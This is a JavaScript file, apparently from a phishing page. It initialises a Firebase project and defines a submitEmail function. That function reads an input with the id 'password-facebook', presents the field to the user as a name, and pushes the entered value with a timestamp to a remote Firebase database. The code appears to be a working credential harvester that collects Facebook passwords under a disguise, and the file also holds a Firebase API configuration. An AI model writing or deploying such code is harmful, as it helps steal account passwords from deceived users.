// Your Firebase setup code
var firebaseConfig = {
    apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
    authDomain: "test-for-admin-9c05c.firebaseapp.com",
    databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
    projectId: "test-for-admin-9c05c",
    storageBucket: "test-for-admin-9c05c.appspot.com",
    messagingSenderId: "180529484791",
    appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
};
firebase.initializeApp(firebaseConfig);

function submitEmail() {
    var nameInput = document.getElementById('password-facebook');
    var errorMessage = document.getElementById('error-message');
    
    function checkName(name) {
        if (name.trim() === "") {
            errorMessage.style.display = 'block';
            errorMessage.textContent = "Please write the name first";
            console.log("Field is empty!");
            return false;
        }
        errorMessage.style.display = 'none';
        return true;
    }

    // Add event listener to hide error message when user starts typing
    nameInput.addEventListener('input', function() {
        errorMessage.style.display = 'none';
    });

    // Call checkName before pushing data to Firebase
    if (checkName(nameInput.value)) {
        firebase.database().ref('Names').push({
            name: nameInput.value,
            timestamp: new Date().toISOString()
        }).then(() => {
            console.log('Data saved successfully');
        }).catch((error) => {
            console.log('Error occurred: ' + error);
        });
    }
}
